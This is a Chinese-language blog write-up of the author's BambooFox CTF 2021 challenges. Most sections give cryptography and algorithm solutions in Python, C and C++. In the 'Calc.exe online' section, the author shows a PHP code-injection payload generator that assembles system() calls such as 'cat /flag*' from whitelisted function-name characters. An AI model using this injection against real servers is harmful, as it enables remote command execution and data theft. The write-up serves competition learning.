---
title: "BambooFox CTF 2021"
date: 2021-01-19T12:09:52+08:00
draft: false
mathjax: true
tags: [CTF, experience]
---

# BambooFox CTF 2021
這次是第二次參加BambooFox，不過事前都沒有做什麼練習wwww本來想說去OT之前推薦過的網站練習一些基礎，但是忘記是什麼網站了888
依然是跟joy一隊，然後另一個隊友變成casper了

今年似乎是大進步，不過我懷疑只是因為考很多演算法題orz

來講一些有解的題目，很抱歉我不知道怎麼讓我的code折疊起來XD

## Gamer's Cipher
一開場先開了 P versus ♯P，雖然查到解法可是精度跟速度都壓不過去，所以只好放棄改開別題。
然後第一個成功的題目就是Gamer's Cipher這一題。
casper說看懂code就解完了（？）不過他沒辦法編譯所以也不知道怎麼辦。
總之我也跑去下載code看，然後查了好一下子怎麼編譯Haskell（記得編譯要加`-dynamic`的flag），成功編譯之後努力看懂code。
看起來像是用[Nimber](https://en.wikipedia.org/wiki/Nimber)對字串加密，
明文和密文的長度都是$n=51$，然後他的key必須要是$n$階的原根，所以我寫了一個腳本看哪些是合法的key。

```sh
#!/bin/bash
# search possible keys
len=51
printf "len = %d\n" $len
for i in $(seq 0 255); do
    echo $i
    printf "%51s\n%d\n" '' $i | tr " " "a" | ./Main 2>/dev/null >/dev/null && printf "i = %d\n\n" $i >> possible.txt
done
```

但是關鍵的加密部份怎麼樣都不確定我看的對不對，所以我先把nimber的乘法表弄成一個文字檔存起來，再另外寫一個python跟Haskell的輸出比對
整理一下之後發現，欸這個式子不就是傅立葉轉換嗎？！（而且還是用Nimber做DFT，酷爆）就想說可能要用多項式插值或是寫inverse FFT
之後用python寫inverse DFT寫掉了，基本上只要把key的乘法反元素找出來帶進去傅立葉轉換的式子就好了

```sh
#!/bin/bash
# build multipication table
# Main.hs:
# main :: IO ()
# main = do
#   a <- readNim
#   b <- readNim
#   print (a * b)
#

cat /dev/null > multable.txt
for i in $(seq 0 255); do
    echo $i
    for j in $(seq 0 255); do
        printf "%d\n%d\n" $i $j | ./Main >> multable.txt
    done
done
```
```python
A = [[0 for j in range(256)] for i in range(256)]

with open('multable.txt', 'r') as f:
    f.readline()
    for i in range(256):
        for j in range(256):
            A[i][j] = int(f.readline())
# print(A)

def div(a, b):
    for i in range(256):
        if A[i][b] == a:
            return i
    return -1

def mul(a, b):
    return A[a][b]

def add(a, b):
    return a ^ b

def power(val, n):
    # binpow?
    res = 1
    for i in range(n):
        res = mul(res, val)
    return res

# print("div(1, 65) = ", div(1, 65))
# print("div(1, 51) = ", div(1, 51))


def encrypt(message, key):
    n = len(message)
    pows = lambda val: [power(val, i) for i in range(n)]
    keys = pows(key)
    coef = [mul(message[i], keys[i]) for i in range(n)][::-1]
    res = [0 for i in range(n)]
    for i in range(n):
        s = 0
        pv = pows(keys[i])
        for j in range(n):
            s = add(s, mul(coef[j], pv[j]))
        res[i] = add(keys[i], s)
    print(coef)
    # print(res)
    return res

def decrypt(res, key):
    n = len(res)
    pows = lambda val: [power(val, i) for i in range(n)]
    keys = pows(key)
    # coef = [mul(message[i], keys[i]) for i in range(n)][::-1]
    coef = [0 for i in range(n)];
    for i in range(n):
        pv = pows(keys[n-i if i > 0 else 0])
        s = 0
        for j in range(n):
            s = add(s, mul(add(res[j], keys[j]), pv[j]))
            coef[i] = s
    # print(coef)
    message = ''
    for i in range(n):
        message += chr(div(coef[n-1-i], keys[i]))
    print(message)

# t = encrypt([i for i in range(51)], 65)
# decrypt(t, 65)
# exit()

sec = [13,1,114,230,244,145,218,78,204,36,81,48,148,35,40,50,78,40,88,43,122,39,41,149,208,208,191,68,65,61,224,140,18,239,104,210,110,119,178,27,173,253,15,237,85,192,82,74,148,15,250]
# res = encrypt([ord(c) for c in input()], int(input()))
ks = [102, 122, 125, 132, 140, 147, 150, 154, 159, 166, 172, 176, 180, 187, 191, 195, 196, 200, 207, 213, 216, 225, 239, 242, 244, 251, 253, 65, 69, 83, 86, 96]
for k in ks:
    decrypt(sec, k)
```

# Better than ASM
這時候joy似乎在看交替看各題，casper在解verilog
然後我發現calc.exe有給source code很佛 :D 雖然是放在網頁隱藏的元素上面，不過點進去html就看得到了。但是不太知道要幹嘛。
只好交替看各題，看了reverse最後面這題給的檔案，把副檔名拿去google發現似乎是LLVM，而且跟wiki上面LLVM的中間語言，Intermediate Representation格式應該是吻合的。
執行`lli task.ll`可以執行這個bitcode，但是他就只是個會問你答不出來的問題的小壞蛋
畢竟我不會看這種很像組語的東西，所以就找一下有沒有轉換的工具，還真的在github上看到有llvm2c這個工具可以轉換成C語言，我還不star爆 XDD
換成C語言之後發現超多goto，不過其實都只是if跟for迴圈產生的goto而已，沒有特別混淆的感覺。
倒是變數用的超級多，大概是因為組語會把強制轉型跟那些暫時變數寫出來吧（例如算`(i+1)%n`就會`int var3 = i+1; var3 % n`或是複製一遍同樣的數字只是因為要轉unsigned）

總之他做的是只是`input -> validate -> win/fail`，他的win會要用到input的字串然後做一些加密還是hash的動作，而`validate`只是檢查input的兩兩相鄰字元是否跟某個常數陣列相符，所以我枚舉第一個字元就能得知整個字串，接著call `win`看輸出就可以找到flag了。老實說我一開始還以為做錯了，因為要從幾十個亂碼裡面找出合理的輸出比想像中難，何況他的flag還是用[Leetspeak](https://zh.wikipedia.org/zh-tw/Leet)寫出來的XD怎麼找到的我都不知道。
下面是我最後化簡的code，全域的陣列大部份刪掉以便閱讀，可以看到main裡面還留了一些goto，基本上就只是在做for迴圈而已

```c
#include <stdio.h>
#include <string.h>
// function declarations
// extern unsigned int __isoc99_scanf(unsigned char* var0, ...);
unsigned int check(unsigned char* var0);
int main(void);
// extern unsigned int printf(unsigned char* var0, ...);
// extern unsigned long strlen(unsigned char* var0);

// global variable definitions
unsigned char format[64] = { ... };
unsigned char flag[64] = { ... };
unsigned char what[64] = { ... };
unsigned char secret[64] = { ... };
unsigned char _str[49] = { ... };
unsigned char _str_1[25] = { ... };
unsigned char _str_2[7] = { ... };
unsigned char _str_3[5] = { ... };
unsigned char _str_4[81] = { ... };

unsigned int check(unsigned char* str){
    unsigned int i;
    for(i = 0; i < strlen(what); i++) {
        int a = str[i], b = str[(i+1)%strlen(what)];
        if((a ^ b) != ((int)(what[i])))
            return 0;
    }
    return 1;
}

unsigned char str[64];
void solve(char c) {
    unsigned int i, n = strlen(what);
    str[0] = c;
    for(i = 0; i+1 < n; i++) {
        str[i+1] = str[i] ^ what[i];
    }
    str[n] = 0;
    // printf("%c\n%c\n", str[n-2], str[n-1]);
    // puts(str);
    // printf("%u\n", strlen(str));
}

int answer(unsigned char var1[]) {
    unsigned int var2;
    unsigned int var3;
    unsigned long var4;
    long var5;
    int var6;
    long var7;
    long var8;
    int var9;
    long var10;
    // printf(&(_str[0]));
    // printf(&(_str_1[0]));
    // printf(&(_str_2[0]));
    // puts(what);
    // scanf(&(_str_3[0]), &(var1[0]));
    var4 = strlen(&(var1[0]));
    // printf("input = %s\n", var1);
    // printf("var4 = %d\n", (int)var4);
    // printf("strlen(what) = %d\n", (int)strlen(what));
    if (var4 != strlen(&(what[0]))) {
        return 1;
        printf(&(_str_4[0]));
        return 1;
    } else {
        if (check(&(var1[0])) != 0) {
            // printf("Here!\n");
            var2 = 0;
            goto block4;
            // here is for loop
            block4:
            var5 = ((long)var2);
            if (((unsigned long)var5) < strlen(&(var1[0]))) {
                var6 = ((int)(var1[(long)var2]));
                var7 = ((long)var2);
                (var1[(long)var2]) = ((unsigned char)(var6 ^ ((int)(secret[((unsigned long)var7) % strlen(&(secret[0]))]))));
                var2 = (((int)var2) + ((int)1));
                goto block4;
            } else {
                printf("output = %s\n\n", var1);
                // printf(&(format[0]), &(var1[0]));
                return 0;
            }
        } else {
            return 3;
            var3 = 0;
            goto block9;
            // here is for loop
            block9:
            var8 = ((long)var3);
            if (((unsigned long)var8) < strlen(&(var1[0]))) {
                var9 = ((int)(flag[(long)var3]));
                var10 = ((long)var3);
                (var1[(long)var3]) = ((unsigned char)(var9 ^ ((int)(secret[((unsigned long)var10) % strlen(&(secret[0]))]))));
                var3 = (((int)var3) + ((int)1));
                goto block9;
            } else {
                printf(&(format[0]), &(var1[0]));
                return 0;
            }
        }
    }
}

int main(void) {
    for(int i = 0; i < 128; i++) {
        solve(i);
        answer(str);
    }
}
```

# Calc.exe online
不久之後casper把verilog(flag checker)給做出來了
我也弄出來說`sin[0]`會跑出s這個字串（不記得是google還是試出來的了）
然後Google發現大概是webshell這個主題，接著又找到可以用`('system')()`之類的方法執行函數，我就照著找到的東西試試看`('phpinfo')()`，
然後真的跑出東西了XD
但是我很多字元弄不出來，後來查到可以用`chr`這個函數，就能成功湊出所有的字元啦！
不過我不知道flag在哪裡，所以執行了`('system')('find / -name "flag*')`找到flag在哪裡，最後執行了`('system')('cat /flag*')`得到flag的內容
下面是我最後拿來湊出字元的腳本

```python
good = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh', 'ncr', 'npr', 'number_format']

mp = {}
for s in good:
    for j in range(len(s)):
        if s[j] not in mp or len(mp[s[j]]) > len(s)+2+len(str(j)):
            mp[s[j]] = s + '[' + str(j) + ']'

# print(mp)

def solve(s):
    ret = ''
    first = True
    for c in s:
        if not first:
            ret += '.'
        first = False
        if c not in mp:
            ret += f'(({solve("chr")})({ord(c)}))'
        else:
            ret += mp[c]
    return ret


# print('(' + solve('system') + ')' + '(' + solve('find / -name flag*') + ')') # call ('system')('ls')
print('(' + solve('system') + ')' + '(' + solve('cat /flag*') + ')') # call ('system')('ls')

# print(solve('echo'))
# print(solve('getallheaders'))
# print(solve('system'))
# print(solve('ls'))
```

# P versus ♯P
接下來我基本上通宵都在弄這題。我覺得這題很有趣，題目是server會丟給你一個有障礙物的棋盤方格，簡單版本是問是否可以用1x2的骨牌蓋滿而困難版本是問有幾種方法。
這個之前蕭梓宏好像講過，所以我知道他是可作的，就是平面圖的完美匹配個數。google之後找到CSDN有現成的code，先感謝owo
不過可惜他是對998244353 mod，而且加邊的方式也有些不同，所以我稍微改了一下code，改成日月卦長的大數，不過速度真的很慢，超級慢QQ
我猜是因為途中數字會變超大所以速度就燒雞。我找各種python的套件要高精度快速做矩陣行列式的都找不到可以用的QQ所以我最後決定用中國剩餘定理，選夠多的質數算XD
這樣行列式還是算的頗慢，大概在12~13筆就會卡住了，於是就卡關跑去解Gamer's Cipher和別題。

晚上的時候想到這張圖是平面圖，因此矩陣是稀疏的，跑去github上面找了稀疏矩陣行列式，還真的有XD [真香](https://github.com/yosupo06/library-checker-problems/blob/master/math/sparse_matrix_det/sol/correct.cpp) 而且作法還是跟之前看過得中國IOI國家隊論文寫的一樣XDD
所以就套上去，但是但是！這樣還是不夠快，時間已經到了隔天凌晨七點，我嘗試最後一次後就把檔案丟給隊友倒下去了。
起床是十二點多，最後我是又找到另外一個github上面的 [code](https://gist.github.com/simonlindholm/51f88e9626408723cf906c6debd3814b) 可以加速同餘下的乘法才終於成功把時間壓到範圍內，做出來真的成就感滿滿。

我最後的code有點長，之後再考慮另外放好了

# Ransomware
The vault是web assembly，被casper解決掉。同時joy也催促（？）我解這題，雖然他已經剩下50分了QQ
總之他給了.pyc檔跟一個`flag.enc`的檔案，把byte code用工具（decompyle之類的，不知道版本重不重要，不過以magic numbe來看這個.pyc似乎是3.8）轉回來.py之後就可以輕鬆知道他是把`flag.png`以官方網頁上面的文字當作金鑰用AES加密成`flag.enc`，
用同一個套件解密後得到`flag.png`寫著the flag is after this image，我一頭霧水丟給joy他就直接找出真正的flagㄌ，似乎是兩張png黏在一起的梗。

```python
# decompyle3 version 3.3.2
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.0 (default, Jan 17 2021, 16:18:58) 
# [GCC 10.2.0]
# Embedded file name: task.py
# Compiled at: 2021-01-14 22:13:24
# Size of source mod 2**32: 420 bytes

from Crypto.Cipher import AES

# def func(key, iv, data, AES):
#     open('flag.enc', 'wb').write(AES.new(key, AES.MODE_CBC, iv).encrypt(lambda x: x + b'\x00' * (16 - len(x) % 16)(data)))

def decrpt(key, iv, AES):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    raw = open('flag.enc', 'rb').read()
    print(len(raw))
    open('flag.png', 'wb').write(cipher.decrypt(raw))

data = __import__('requests').get('https://ctf.bamboofox.tw/rules').text.encode()
key = 99
iv = 153

# func(data[key:key + 16], data[iv:iv + 16], open('flag.png', 'rb').read(), __import__('Crypto.Cipher.AES').Cipher.AES) if len(data) != 0 else lambda fn: __import__('os').remove(fn)('task.py'))

decrpt(data[key:key+16], data[iv:iv+16], AES)
# okay decompiling task.pyc
```

# orz Network
被casper丟了這題，他說這是質數什麼的題目應該交給我
看起來像是隨便找一棵生成樹然後把每條邊都解密就可以了，他使用的加密方法是Diffie-Hellman，去維基百科可以翻到公鑰與私鑰各自的定義。
總之，要求私鑰我們就必須求離散對數，但是他的數字範圍給到10^18而且有419個數字要解，很明顯不能直接大步小步做完，
經過一番google，我發現了Pohlig-Hellman algorithm，是可以在大約sqrt(p)的量級解離散對數，其中p是mod的phi值（=mod-1）的最大質因數。因為完全沒有找到C++的code所以我自己按照維基上面的敘述刻，花了一段時間之後可以在合理的時間內解出某條邊了。
接下來就找生成樹然後對那些邊解密就對了。這題比前面幾題的演算法題簡單多了，雖然還是套了一大堆模板XDD
直接去抄waynedisonitau123的Pollard-Rho還有Millar-Rabin好爽喔XDDD
然後大步小步跟中國剩餘也都不用自己寫，對打高中競程的人來說真的是夢幻待遇(X


### solve.cpp
```cpp
#include <bits/extc++.h>

using namespace std;
using ll = long long;

using LLL = __int128;

ll modpow(ll e, ll p, ll m) {
    ll r = 1;
    while(p) {
        if(p & 1) r = (LLL)r * e % m;
        e = (LLL) e * e % m;
        p >>= 1;
    }
    return r;
}

ll modmul(ll a, ll b, ll m) {
    return (LLL) a * b % m;
}

struct Factorization {
    struct MillerRabin {
        // n < 4759123141     chk = [2, 7, 61]
        // n < 1122004669633  chk = [2, 13, 23, 1662803]
        // n < 2^64           chk = [2, 325, 9375, 28178, 450775, 9780504, 1795265022]
        vector<long long> chk = {2,325,9375,28178,450775,9780504,1795265022};
        bool Check(long long a, long long u, long long n, int t) {
            a = modpow(a, u, n);
            if (a == 0 || a == 1 || a == n - 1) return true;
            for (int i = 0; i < t; ++i) {
                a = modmul(a, a, n);
                if (a == 1) return false;
                if (a == n - 1) return true;
            }
            return false;
        }
        bool operator()(long long n) {
            if (n < 2) return false;
            if (n % 2 == 0) return n == 2;
            long long u = n - 1; int t = 0;
            for (; !(u & 1); u >>= 1, ++t);
            for (long long i : chk) {
                if (!Check(i, u, n, t)) return false;
            }
            return true;
        }
    } prime;
    map<long long, int> cnt;
    void pollardRho(long long n) {
        if (n == 1) return;
        if (prime(n)) return ++cnt[n], void();        
        if (n % 2 == 0) return pollardRho(n / 2), ++cnt[2], void();
        long long x = 2, y = 2, d = 1, p = 1;
        auto f = [&](auto x, auto n, int p) { return (modmul(x, x, n) + p) % n; };
        while (true) {
            if (d != n && d != 1) {
                pollardRho(n / d);
                pollardRho(d);
                return;
            }
            if (d == n) ++p;
            x = f(x, n, p); y = f(f(y, n, p), n, p);
            d = __gcd(abs(x - y), n);
        }
    }
    ll mxPrime(ll n) {
        ll mx = 0;
        cnt.clear();
        pollardRho(n);
        for(auto [a, b]: cnt) mx = max(mx, a);
        return mx;
    }
} factor;


struct CRT {
    ll R, M;
    CRT() : R(0), M(1) {}
    template <typename T> tuple<T, T, T> extgcd(T a, T b) {
        if (!b) return make_tuple(a, 1, 0);
        T d, x, y;
        tie(d, x, y) = extgcd(b, a % b);
        return make_tuple(d, y, x - (a / b) * y);
    }
    void add(ll r, ll m) {
        long long d, x, y; 
        tie(d, x, y) = extgcd(M, m * 1ll);
        assert ((r - R) % d == 0);
        long long new_M = M / __gcd(M, 1ll * m) * m; 
        R += modmul(modmul(x, (r - R) / d, new_M), M, new_M);
        M = new_M;
        ((R %= M) += M) %= M;
    }
    pair<ll,ll> operator()() const {
        return {R, M};
    }
};

ll BSGS(ll a, ll b, ll m, ll T) {
    // a^x = b (mod m), and T is the period
    ll n = sqrt(T) + 1;

    ll an = modpow(a, n, m);

    unordered_map<ll, ll> vals;
    for (ll q = 0, cur = b; q <= n; ++q) {
        vals[cur] = q;
        cur = ((LLL) cur * a) % m;
    }
    // std::cerr << "q = " << q << '\n';

    for (ll p = 1, cur = 1; p <= n; ++p) {
        cur = ((LLL) cur * an) % m;
        if (vals.count(cur)) {
            ll ans = n * p - vals[cur];
            return ans;
        }
    }
    cerr << "a = " << a << " b = " << b << " m = " << m << " T = " << T << '\n';
    cerr << "NOT FOUND\n";
    exit(1);
}

using __gnu_cxx::power;

ll discreteLog(ll a, ll b, ll m) {
    // m is prime
    auto solve = [m](ll g, ll h, ll p, ll e) {
        ll x = 0;
        ll r = modpow(g, power(p, e-1), m);
        ll invg = modpow(g, m-2, m);
        for(int k = 0; k < e; k++) {
            ll hk = modpow(modmul(modpow(invg, x, m), h, m), power(p, e-1-k), m);
            ll d = BSGS(r, hk, m, p);
            x += power(p, k) * d;
            // cerr<<"k = "<<k<<" ; ";
        }
        // cerr << '\n';
        return x;
    };
    ll phi = m-1;
    CRT crt;
    for(auto [p, e]: factor.cnt) {
        ll P = power(p, e);
        ll X = solve(modpow(a, phi / P, m), modpow(b, phi / P, m), p, e);
        crt.add(X, P);
    }
    assert(crt().second == phi);
    assert(modpow(a, crt().first, m) == b);
    return crt().first;
}


struct Edge {
    int j;
    ll m, g, A, B;
    Edge(int j, ll m, ll g, ll A, ll B) : j(j), m(m), g(g), A(A), B(B) {}
};

signed main() {
    std::cerr << "solve.cpp::main() start.\n";
    ios_base::sync_with_stdio(0), cin.tie(0);
    const int n = 420;
    int a, b;
    vector<vector<Edge>> adj(n);
    while(cin >> a >> b) {
        assert(1 <= a && a <= n && 1 <= b && b <= n && a != b);
        ll m, g, A, B;
        cin >> m >> g >> A >> B;
        --a, --b;
        adj[a].emplace_back(b, m, g, A, B);
        adj[b].emplace_back(a, m, g, B, A);
    }
    vector<ll> ans;
    vector<int> vis(n);
    function<void(int)> dfs = [&](int i) {
        vis[i] = true;
        for(auto [j, m, g, A, B]: adj[i]) {
            if(vis[j]) continue;
            if(factor.mxPrime(m-1) >= 1e15) {
                cerr << m-1 << '\n';
                continue;
            }
            // cerr << A << ' ' << B << '\n';
            ll sa = discreteLog(g, A, m);
            ll sb = discreteLog(g, B, m);
            assert(modpow(g, sa, m) == A && modpow(g, sb, m) == B);
            ans.emplace_back(modpow(A, sb, m));
            // cerr << ans.back() << '\n';
            dfs(j);
        }
    };
    dfs(0);
    std::cerr << "ans.size() = " << ans.size() << '\n';
    assert(ans.size() == n-1);
    for(ll x: ans)
        cout << x << '\n';
}
```

### solve.py
```python
#!/usr/bin/env python3
import os
import sys
import time
import socket
import hashlib
import re
import random

host = "chall.ctf.bamboofox.tw"
port = 10369

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
print('connect success')

def pow_solver(prefix, difficulty):
    zeros = '0' * difficulty
    def is_valid(digest):
        if sys.version_info.major == 2:
            digest = [ord(i) for i in digest]
        bits = ''.join(bin(i)[2:].zfill(8) for i in digest)
        return bits[:difficulty] == zeros
    i = 0
    while True:
        i += 1
        s = prefix + str(i)
        if is_valid(hashlib.sha256(s.encode()).digest()):
            return i

def main():
    print('main start')
    question = s.recv(4096)
    question = question.decode('ascii')
    print(question)
    question = question[58:74]
    print(question)

    ans = pow_solver(question, 20)
    print(str(ans) + '\n')
    s.send(bytes(str(ans) + '\n', 'ascii'))
    _ = s.recv(4096)
    print(_.decode('utf-8'))
    s.send(bytes('\n', 'utf-8'))
    with open('edges.txt', 'w') as f:
        while True:
            _ = s.recv(4096)
            if len(_) == 0:
                break
            content = _.decode('ascii')
            # print(content)
            content = re.sub("[^\d\s]", "", content)
            f.write(content)

            if _.decode('ascii').find("Enter") != -1:
                break;
    os.system("./solve < edges.txt > ans.txt")
    with open("ans.txt", "r") as f:
        ans = f.readlines();
        print(ans, len(ans))
        ans = ' '.join([x.strip() for x in ans])
    print(ans)
    s.send(bytes(str(ans) + '\n', 'ascii'))

    res = s.recv(1024)
    print(res.decode('utf-8'))
    # os.system("./solve")
    

main()
```

```sh
g++ solve.cpp -o solve -std=c++17
python solve.py
```

# After that
接下來我又花了一個半夜去嘗試Web題
time to draw看起來就是要對那個api做怪事情，但我整個方向錯誤了，我誤以為是要XSS所以瘋狂送`color={"match": "function() { ... }"}`的請求，但其實根本沒辦法執行這字串裡面的東西QQ
我也有看表情符號那一題，但是實在對PHP太陌生了，我現在連官方解答都不知道為什麼會對，他不是會檢查長度嗎？？？
總之，我覺得我們web跟pwn太弱了（或者說這次出的都是演算法題XD）
不知道這種injection應該如何練習是好(X

最後名次是12名，跟去年比起來進步不只一半
而且意外的是我們是台灣前三名所以可以拿獎金耶，超爽der
明年不意外應該也是會來玩ㄅ，不過如果問我途中會不會認真學大概就是不會吧owo
打CTF真的很讓人享受解謎（？）的過程，不過也可能只是因為解的出來才享受吧。另外打CTF還有一個優點就是不會被ZCK電爛很開心(X
